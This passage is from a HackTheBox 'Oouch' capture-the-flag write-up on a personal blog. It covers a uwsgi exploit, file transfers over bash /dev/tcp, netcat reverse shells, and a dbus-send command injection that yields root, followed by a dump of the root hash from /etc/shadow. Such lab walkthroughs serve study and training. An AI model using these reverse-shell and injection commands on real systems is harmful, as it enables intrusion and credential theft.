+</span></span></code></pre></div><p>Start a web server from you attacker machine.</p><p>On oouch machine retrieve the uwsgi exploit.</p><pre tabindex=0><code>$ cd /tmp
+$ wget http://10.10.15.142:8000/uwsgi_exp.py
+</code></pre><p>Now we need to transfer then into the docker container but there aren&rsquo;t many binaries inside. So we will have to use a <a href=https://gtfobins.github.io/gtfobins/bash/#file-download>GTFOBins tricks</a> with bash to download the file inside the container.</p><p>First start TCP socket on oouch machine.</p><pre tabindex=0><code>$ nc -l -p 12345 &lt; /tmp/uwsgi_exp.py
+$ nc -l -p 12345 &lt; /usr/bin/nc
+</code></pre><p>And download it from the container:</p><pre tabindex=0><code>$ export RHOST=172.17.0.1
+$ export RPORT=12345
+$ export LFILE=uwsgi_exp.py
+$ bash -c &#39;cat &lt; /dev/tcp/$RHOST/$RPORT &gt; $LFILE&#39;
+$ export LFILE=nc
+$ bash -c &#39;cat &lt; /dev/tcp/$RHOST/$RPORT &gt; $LFILE&#39;
+$ chmod +x nc
+</code></pre><p>Note: since there is ssh, it was possible to transfer via <code>scp</code> too.</p><p>Let&rsquo;s exploit now!</p><p>On oouch:</p><pre tabindex=0><code>nc -nlvp 12345
+</code></pre><p>In the container:</p><pre tabindex=0><code>$ python3 uwsgi_exp.py -m unix -u /tmp/uwsgi.socket -c &#34;/home/qtc/nc -e /bin/bash 172.17.0.1 12345&#34;
+</code></pre><p>Now we obtained a <code>www-data</code> shell.</p><pre tabindex=0><code>$ nc -nlvp 12345
+listening on [any] 12345 ...
+connect to [172.17.0.1] from (UNKNOWN) [172.18.0.3] 47676
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre><h3 id=dbus-exploitation>DBUS Exploitation<a hidden class=anchor aria-hidden=true href=#dbus-exploitation>#</a></h3><ul><li><code>www-data</code> can receive and send message from dbus.</li><li><code>www-data</code> owns uwsgi.</li></ul><p>It&rsquo;s always better with a PTY.</p><pre tabindex=0><code>$ python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+</code></pre><p>We start a listener on oouch machine:</p><pre tabindex=0><code>$ nc -nlvp 9999
+</code></pre><p>Now we can use <code>dbus-send</code> to gain a root shell:</p><pre tabindex=0><code>dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block &#34;string:;rm /tmp/.cyfun; mkfifo /tmp/.cyfun; cat /tmp/.cyfun | /bin/bash -i 2&gt;&amp;1 | nc 172.17.0.1 9999 &gt;/tmp/.cyfun;&#34;
+</code></pre><p>And we receive the root shell:</p><pre tabindex=0><code>$ nc -nlvp 9999
+listening on [any] 9999 ...
+connect to [172.17.0.1] from (UNKNOWN) [10.10.10.177] 37180
+bash: cannot set terminal process group (2688): Inappropriate ioctl for device
+bash: no job control in this shell
+root@oouch:/root# id
+uid=0(root) gid=0(root) groups=0(root)
+root@oouch:/root# cat root.txt
+cat root.txt
+ff9e6428ad626cb968daba6eb1d33540
+</code></pre><h3 id=bonus>Bonus<a hidden class=anchor aria-hidden=true href=#bonus>#</a></h3><p>To unlock some WU we will need the root hash:</p><pre tabindex=0><code># cat /etc/shadow | grep root
+root:$6$UQS7GJnfVbWRz5KO$vEaGmrfKvdrqh50eCr7D3AAruNfPe1dYhiv..ykDhlWWYvgaoabrqujg51k60bQz3jgTx.yXh5jCHNZ6ArkQ.1:18303:0:99999:7:::
+</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/hard/>Hard</a></li></ul><nav class=paginav><a class=prev href=https://s4ch.github.io/writeups/hackthebox/fatty/><span class=title>« Prev</span><br><span>Fatty </span></a><a class=next href=https://s4ch.github.io/writeups/hackthebox/book/><span class=title>Next »</span><br><span>Book</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
